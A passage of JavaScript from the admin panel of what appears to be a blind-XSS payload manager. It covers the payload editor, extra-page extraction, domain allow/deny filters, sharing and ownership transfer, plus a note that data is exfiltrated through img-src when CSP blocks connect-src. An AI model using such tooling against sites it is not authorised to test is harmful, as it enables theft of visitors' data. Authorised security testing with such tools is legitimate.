                ? '<p class="cspres__note">connect-src is blocked, so the callback can’t post back. With CSP-bypass beacons enabled, data is still sent out through <b>img-src</b>.</p>'
                : '<p class="cspres__note">connect-src and img-src are both blocked: a beacon can confirm the hit but not carry full data back.</p>';
            }
          } else {
            pick = { nojs: true, type: a.best };
            html += '<p class="cspres__d">Fall back to a no-JS probe on an open directive:</p>';
            html += '<div class="cspres__chips">' + a.open.map(function (dir) {
              return '<button type="button" class="cspres__chip" data-dir="' + util.escapeHtml(dir) + '" aria-pressed="' + (dir === a.best ? "true" : "false") + '">' + util.escapeHtml(dir) + "</button>";
            }).join("") + "</div>";
          }
          html += EZ.csp.findingsHtml(a.findings);
          result.innerHTML = '<div class="cspres">' + html + "</div>";
          result.hidden = false; apply.disabled = false;
          dom.qsa(".cspres__chip", result).forEach(function (c) {
            dom.on(c, "click", function () {
              dom.qsa(".cspres__chip", result).forEach(function (x) { x.setAttribute("aria-pressed", String(x === c)); });
              pick = { nojs: true, type: c.getAttribute("data-dir") };
            });
          });
        }

        dom.on(input, "input", render);
        dom.on(apply, "click", function () {
          if (pick) { setMode(pick.nojs, pick.type); }
          EZ.ui.closeModalById("csp-modal");
        });
        EZ.ui.openModal("csp-modal");
        if (input) { input.focus(); }
      });
    }

    setMode(false, "script");
  }

  function renderEditor(r, p) {
    var id = p.id;
    payloadGates = p.gates || null;
    var endpoint = "/payloads/update/" + id;
    var isOwner = !!(EZ.state.user && Number(p.user_id) === Number(EZ.state.user.id));
    var canDelete = util.can("payload.delete") || isOwner;

    setTitle("Payload \u00b7 " + (p.identifier || ""));

    var canReassign = isAdmin();
    var canShare = isAdmin() || util.can("payload.share");
    var shareBtn = canShare
      ? '<button class="btn btn--sm" type="button" id="pl-share">Access</button>'
      : "";
    var transferBtn = canReassign
      ? '<button class="btn btn--sm" type="button" id="pl-transfer">Transfer</button>'
      : "";
    var deleteBtn = canDelete
      ? '<button class="btn btn--sm" type="button" id="pl-delete">Delete</button>'
      : "";
    var rightGroup = (shareBtn || transferBtn || deleteBtn)
      ? '<div class="toolbar__group">' + shareBtn + transferBtn + deleteBtn + "</div>"
      : "";

    var actions =
      '<div class="toolbar toolbar--actions">' +
        '<a class="toolbar__back" href="#" data-screen="payloads">\u2190 All payloads</a>' +
        rightGroup +
      "</div>";

    r.innerHTML =
      actions +
      copyCard(p) +
      '<div class="editgrid" data-endpoint="' + endpoint + '" style="margin-top:var(--space-lg)">' +
        collectCard(p) + behaviourCard(p) +
        pagesCardHTML() + filtersCardHTML() +
        customjsCard(p, "before") + customjsCard(p, "after") +
        extensionsCard() +
      "</div>";

    bindBuilder(p);

    renderPageChips(p);
    renderFilterChips(p);
    bindPageControls(p);
    bindFilterControls(p);

    if (canDelete) { dom.on(el("pl-delete"), "click", function () { deletePayload(p); }); }

    if (canReassign) { dom.on(el("pl-transfer"), "click", function () { openTransferModal(p); }); }

    if (canShare) { dom.on(el("pl-share"), "click", function () { openShareModal(p); }); }

    if (!featureOff("extensions")) { loadExtensions(p); }

    if (EZ.autosave && EZ.autosave.snapshot) { EZ.autosave.snapshot(r); }
  }

  function pagesCardHTML() {
    var off = featureOff("pages");
    var inner =
      '<div class="chips" data-pages-chips></div>' +
      '<div class="inputrow">' +
        '<input class="input mono" id="pl-page-input" type="text" placeholder="/path/to/collect" spellcheck="false"' + (off ? " disabled" : "") + '>' +
        '<button class="btn" type="button" id="pl-page-add"' + (off ? " disabled" : "") + ">Add</button>" +
      "</div>";
    return '<div class="subcard"><h3>Extract extra pages</h3>' + (off ? offBlur(inner, behaviourReason("pages")) : inner) + "</div>";
  }

  function renderPageChips(p) {
    var box = dom.qs("[data-pages-chips]");
    if (!box) { return; }
    var pages = p.pages || [];
    if (!pages.length) {
      box.innerHTML = '<span class="faint" style="font-size:var(--text-sm)">No extra pages.</span>';
      return;
    }
    box.innerHTML = pages.map(function (pg) {
      return '<span class="chip">' + util.escapeHtml(pg.path) +
        ' <button type="button" aria-label="Remove ' + util.escapeHtml(pg.path) + '" data-page-remove="' + pg.id + '">&times;</button></span>';
    }).join("");
    dom.qsa("[data-page-remove]", box).forEach(function (b) {
      dom.on(b, "click", function () { removePage(p, b.getAttribute("data-page-remove")); });
    });
  }

  function bindPageControls(p) {
    var add = el("pl-page-add"), input = el("pl-page-input");
    if (add) { dom.on(add, "click", function () { addPage(p); }); }
    if (input) { dom.on(input, "keydown", function (e) { if (e.key === "Enter") { addPage(p); } }); }
  }

  function addPage(p) {
    var input = el("pl-page-input");
    if (!input) { return; }
    var path = input.value.trim();
    if (!path) { input.focus(); return; }
    EZ.api.post("/payloads/addpage/" + encodeURIComponent(p.id), { path: path }).then(function (res) {
      p.pages = (p.pages || []).concat([{ id: res.data.id, path: res.data.path }]);
      input.value = "";
      renderPageChips(p);
      EZ.ui.flashSaved();
    }).catch(function () {});
  }

  function removePage(p, pageId) {
    EZ.api.del("/payloads/deletepage/" + encodeURIComponent(p.id) + "/" + encodeURIComponent(pageId)).then(function () {
      p.pages = (p.pages || []).filter(function (pg) { return String(pg.id) !== String(pageId); });
      renderPageChips(p);
      EZ.ui.flashSaved();
    }).catch(function () {});
  }

  function filtersCardHTML() {
    var off = featureOff("filters");
    var inner =
      '<div class="chips" data-filters-chips></div>' +
      '<div class="inputrow">' +
        '<input class="input mono" id="pl-filter-input" type="text" placeholder="domain or *.wildcard" spellcheck="false"' + (off ? " disabled" : "") + '>' +
        '<select class="input" id="pl-filter-type" style="max-width:110px"' + (off ? " disabled" : "") + '><option value="allow">Allow</option><option value="deny">Deny</option></select>' +
        '<button class="btn" type="button" id="pl-filter-add"' + (off ? " disabled" : "") + ">Add</button>" +
      "</div>";
    return '<div class="subcard"><h3>Allow / deny filters</h3>' + (off ? offBlur(inner, behaviourReason("filters")) : inner) + "</div>";
  }

  function renderFilterChips(p) {
    var box = dom.qs("[data-filters-chips]");
    if (!box) { return; }
    var filters = p.filters || { allow: [], deny: [] };
    var allow = filters.allow || [], deny = filters.deny || [];
    if (!allow.length && !deny.length) {
      box.innerHTML = '<span class="faint" style="font-size:var(--text-sm)">No filters - every origin is collected.</span>';
      return;
    }
    function chip(f, type) {
      return '<span class="chip chip--' + type + '">' + util.escapeHtml(f.domain) +
        ' <button type="button" aria-label="Remove ' + util.escapeHtml(f.domain) + '" data-filter-remove="' + f.id + '">&times;</button></span>';
    }
    box.innerHTML =
      allow.map(function (f) { return chip(f, "allow"); }).join("") +
      deny.map(function (f) { return chip(f, "deny"); }).join("");
    dom.qsa("[data-filter-remove]", box).forEach(function (b) {
      dom.on(b, "click", function () { removeFilter(p, b.getAttribute("data-filter-remove")); });
    });
  }

  function bindFilterControls(p) {
    var add = el("pl-filter-add"), input = el("pl-filter-input");
    if (add) { dom.on(add, "click", function () { addFilter(p); }); }
    if (input) { dom.on(input, "keydown", function (e) { if (e.key === "Enter") { addFilter(p); } }); }
  }

  function addFilter(p) {
    var input = el("pl-filter-input"), typeSel = el("pl-filter-type");
    if (!input) { return; }
    var domain = input.value.trim();
    var type = (typeSel && typeSel.value) === "deny" ? "deny" : "allow";
    if (!domain) { input.focus(); return; }
    EZ.api.post("/payloads/addfilter/" + encodeURIComponent(p.id), { domain: domain, type: type }).then(function (res) {
      p.filters = p.filters || { allow: [], deny: [] };
      p.filters[type] = (p.filters[type] || []).concat([{ id: res.data.id, domain: res.data.domain }]);
      input.value = "";
      renderFilterChips(p);
      EZ.ui.flashSaved();
    }).catch(function () {});
  }

  function removeFilter(p, filterId) {
    EZ.api.del("/payloads/deletefilter/" + encodeURIComponent(p.id) + "/" + encodeURIComponent(filterId)).then(function () {
      var f = p.filters || { allow: [], deny: [] };
      ["allow", "deny"].forEach(function (t) {
        f[t] = (f[t] || []).filter(function (x) { return String(x.id) !== String(filterId); });
      });
      p.filters = f;
      renderFilterChips(p);
      EZ.ui.flashSaved();
    }).catch(function () {});
  }

  function loadExtensions(p) {
    var box = dom.qs("[data-ext-list]");
    if (!box) { return; }
    var selected = {};
    (p.extensions || []).forEach(function (eid) { selected[Number(eid)] = true; });

    EZ.api.get("/extensions", { noGlobalError: true }).then(function (res) {
      var rows = (res.data || []).filter(function (x) { return x.enabled; });
      if (!rows.length) {
        box.innerHTML = '<p class="field-hint">No enabled extensions available.</p>';
        return;
      }
      var forced = globals.globalExts || [];
      box.innerHTML = '<div class="extpick-list">' + rows.map(function (x) {
        var isForced = forced.indexOf(Number(x.id)) !== -1;
        var checked = isForced || !!selected[Number(x.id)];
        return EZ.ui.extPickRow(x, checked, "payloadExtensions", isForced, isForced ? GLOBAL_ON_TIP : "");
      }).join("") + "</div>";
      if (EZ.autosave && EZ.autosave.snapshot) { EZ.autosave.snapshot(box); }
    }).catch(function () {
      box.innerHTML = '<p class="field-hint">Extensions are managed by an administrator in Settings.</p>';
    });
  }

  function ptMsg(text, isError) {
    var box = el("pt-msg");
    if (!box) { return; }
    if (text) {
      box.hidden = false;
      box.textContent = text;
      box.classList.remove("msg--error", "msg--ok");
      box.classList.add(isError ? "msg--error" : "msg--ok");
    } else {
      box.hidden = true;
      box.textContent = "";
    }
  }

  function openTransferModal(p) {
    if (!isAdmin()) { return; }
    var body = el("payload-modal-body");
    if (!body) { return; }
    body.innerHTML =
      '<p class="field-hint" style="margin-bottom:var(--space-md)">Transfer this payload to another user. They become the full owner; existing shares stay intact.</p>' +
      '<div class="field"><label class="field-label" for="pl-transfer-owner">New owner</label>' +
        '<select class="input" id="pl-transfer-owner" aria-label="New owner"><option value="">Loading...</option></select></div>' +
      '<p class="field-hint" id="pt-msg" hidden></p>' +
      '<div style="display:flex;gap:var(--space-sm);justify-content:flex-end;margin-top:var(--space-lg)">' +
        '<button class="btn btn--ghost" type="button" data-close-modal>Cancel</button>' +
        '<button class="btn btn--primary" type="button" id="pl-transfer-submit">Transfer ownership</button>' +
      "</div>";

    setModalTitle("Transfer payload");

    ensureUserMap().then(function () {
      var sel = el("pl-transfer-owner");
      if (!sel) { return; }
      var opts = "";
      Object.keys(userMap).forEach(function (uid) {
        opts += '<option value="' + util.escapeHtml(String(uid)) + '"' +
          (Number(uid) === Number(p.user_id) ? " selected" : "") + ">" +
          util.escapeHtml(userMap[uid]) + "</option>";
      });
      sel.innerHTML = opts || '<option value="">No users</option>';
    });

    dom.on(el("pl-transfer-submit"), "click", function () { transferPayload(p); });

    EZ.ui.openModal("payload-modal");
  }

  function transferPayload(p) {
    var sel = el("pl-transfer-owner");
    if (!sel || !sel.value) { return; }
    if (Number(sel.value) === Number(p.user_id)) {
      ptMsg("Payload already belongs to that user.", true);
      return;
    }
    var btn = el("pl-transfer-submit");
    if (btn) { btn.disabled = true; }
    ptMsg("");
    EZ.api.post("/payloads/reassign/" + encodeURIComponent(p.id), { user: sel.value }, { noGlobalError: true }).then(function () {
      EZ.ui.closeModalById("payload-modal");
      EZ.ui.toast("Payload reassigned.", "success");
      loadEditor(root(), p.id);
    }).catch(function (err) {
      if (btn) { btn.disabled = false; }
      ptMsg((err && err.message) || "Could not reassign the payload.", true);
    });
  }

  function psMsg(text, isError) {
    var box = el("ps-msg");
    if (!box) { return; }
    if (text) {
      box.hidden = false;
      box.textContent = text;
      box.classList.remove("msg--error", "msg--ok");
      box.classList.add(isError ? "msg--error" : "msg--ok");
    } else {
      box.hidden = true;
      box.textContent = "";
    }
  }

  function openShareModal(p) {
    var body = el("payload-share-body");
    if (!body) { return; }
    body.innerHTML = '' + EZ.ui.loading() + '';
    EZ.ui.openModal("payload-share-modal");
    EZ.api.get("/share/get/payloads/" + encodeURIComponent(p.id), { noGlobalError: true }).then(function (res) {
      paintPayloadShare(p, res.data || {});
    }).catch(function (err) {
      var code = err && err.status;
      body.innerHTML = '<p class="field-hint">' +
        util.escapeHtml(code === 403
          ? "You don\u2019t have permission to manage sharing for this payload."
          : ((err && err.message) || "Could not load sharing for this payload.")) + "</p>";
    });
  }

  function setPayloadShare(p, bodyObj, after) {
    EZ.api.post("/share/set/payloads/" + encodeURIComponent(p.id), bodyObj, { noGlobalError: true })
      .then(function (res) {
        paintPayloadShare(p, res.data || {});
        EZ.ui.flashSaved();
        if (after) { after(null); }
      })
      .catch(function (err) {
        psMsg((err && err.message) || "Could not update sharing.", true);
        if (after) { after(err); }
      });
  }

  var PS_TRASH = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M4 7h16M9 7V5a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2M7 7l1 13a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1l1-13" stroke-linecap="round" stroke-linejoin="round"/></svg>';

  function paintPayloadShare(p, state) {
    var body = el("payload-share-body");
    if (!body) { return; }
    var users = state.shared_users || [];

    var levelSw = function (isEdit, label) {
      return '<div class="veswitch" role="group" aria-label="' + label + '" data-share-level>' +
        '<button type="button" data-level="view" aria-pressed="' + (isEdit ? "false" : "true") + '">View</button>' +
        '<button type="button" data-level="edit" aria-pressed="' + (isEdit ? "true" : "false") + '">Edit</button>' +
        "</div>";
    };
    function veLevel(group) {
      var b = group && dom.qs('[aria-pressed="true"]', group);
      return b && b.getAttribute("data-level") === "edit" ? "edit" : "view";
    }
    function wireVE(group, onPick) {
      if (!group) { return; }
      dom.qsa("button", group).forEach(function (b) {
        dom.on(b, "click", function () {
          if (b.getAttribute("aria-pressed") === "true") { return; }
          dom.qsa("button", group).forEach(function (x) { x.setAttribute("aria-pressed", String(x === b)); });
          if (onPick) { onPick(b.getAttribute("data-level")); }
        });
      });
    }

    var listHtml = users.length
      ? '<div class="access-section">' +
          '<span class="field-label access-section__head">People with access</span>' +
          '<div class="access-list">' + users.map(function (u) {
            var isEdit = Number(u.edit) === 1;
            return '<div class="access-row" data-share-user="' + util.escapeHtml(String(u.username)) + '">' +
              '<span class="access-row__name">' + util.escapeHtml(String(u.username)) + "</span>" +
              levelSw(isEdit, "Access level for " + util.escapeHtml(String(u.username))) +
              '<button class="iconbtn iconbtn--sm iconbtn--danger" type="button" data-share-remove aria-label="Remove access" title="Remove access">' + PS_TRASH + "</button>" +
            "</div>";
          }).join("") + "</div>" +
        "</div>"
      : '<p class="field-hint access-empty">Only you have access. Add someone above to share it.</p>';

    body.innerHTML =
      '<div class="field">' +
        '<label class="field-label" for="ps-username">Add user</label>' +
        '<div class="access-add">' +
          '<input class="input mono access-add__name" id="ps-username" type="text" placeholder="exact username" autocapitalize="none" spellcheck="false" autocomplete="off">' +
          '<div class="veswitch" role="group" aria-label="Access level for the new user" id="ps-level">' +
            '<button type="button" data-level="view" aria-pressed="true">View</button>' +
            '<button type="button" data-level="edit" aria-pressed="false">Edit</button>' +
          "</div>" +
          '<button class="btn btn--primary" type="button" id="ps-add">Add</button>' +
        "</div>" +
        '<p class="field-hint access-add__hint"><b>View</b> can read; <b>Edit</b> can also change payload settings and archive or delete reports.</p>' +
        '<p class="field-hint" id="ps-msg" hidden></p>' +
      "</div>" +
      listHtml;

    dom.qsa("[data-share-user]", body).forEach(function (tr) {
      var username = tr.getAttribute("data-share-user");
      var grp = dom.qs("[data-share-level]", tr);
      if (grp) {
        wireVE(grp, function (level) {
          psMsg("");
          setPayloadShare(p, { action: "change_access", username: username, access_type: level });
        });
      }
      var rm = dom.qs("[data-share-remove]", tr);
      if (rm) {
        dom.on(rm, "click", function () {
          psMsg("");
          setPayloadShare(p, { action: "remove_user", username: username });
        });
      }
    });

    var addBtn = el("ps-add"), nameInput = el("ps-username"), addGrp = el("ps-level");
    wireVE(addGrp);
    function doAdd() {
      var username = (nameInput && nameInput.value || "").trim();
      if (!username) { psMsg("Enter a username.", true); if (nameInput) { nameInput.focus(); } return; }
      var selfName = EZ.state.user && EZ.state.user.username;
      if (selfName && username === selfName) {
        psMsg("You already own or have access to this payload.", true);
        if (nameInput) { nameInput.focus(); }
        return;
      }
      var level = veLevel(addGrp);
      psMsg("");
      setPayloadShare(p, { action: "add_user", username: username }, function (err) {
        if (err) { return; }
        if (level === "edit") {
          setPayloadShare(p, { action: "change_access", username: username, access_type: "edit" });
        }
      });
    }
    if (addBtn) { dom.on(addBtn, "click", doAdd); }
    if (nameInput) { dom.on(nameInput, "keydown", function (e) { if (e.key === "Enter") { doAdd(); } }); }
  }

  function deletePayload(p) {
    EZ.ui.confirm({
      title: "Delete payload", danger: true, confirmLabel: "Delete",
      message: "Delete payload \u201c" + (p.identifier || "") + "\u201d? Its pages, filters and collect settings are removed. Captured reports are kept."
    }).then(function (ok) {
      if (!ok) { return; }
      EZ.api.del("/payloads/delete/" + encodeURIComponent(p.id)).then(function () {
        EZ.ui.toast("Payload deleted.", "success");
        EZ.router.navigate("payloads");
      }).catch(function () {});
    });
  }

  if (EZ.autosave && EZ.autosave.register) {
    EZ.autosave.register("payloadCollect", function () {
      var map = {};
      dom.qsa("[data-collect-opt]").forEach(function (c) {
        map[c.getAttribute("data-collect-opt")] = !!c.checked;
      });
      return { collect: map };
    });
    EZ.autosave.register("payloadExtensions", function () {
      var ids = [];
      dom.qsa("[data-ext-id]").forEach(function (c) {
        if (c.checked && !c.disabled) { ids.push(Number(c.getAttribute("data-ext-id"))); }
      });
      return { extensions: ids };
    });
  }

  function invalidateGlobals() { globals = null; userMap = null; }

  EZ.router.register("payloads", {
    mount: function (ctx) {
      var r = root();
      if (!r) { return; }
      var id = ctx && ctx.params && ctx.params.id;
      if (id) { loadEditor(r, id); }
      else { loadList(r); }
    },
    resetState: invalidateGlobals
  });

  EZ.payloads = { invalidateGlobals: invalidateGlobals };
})(window.EZ);
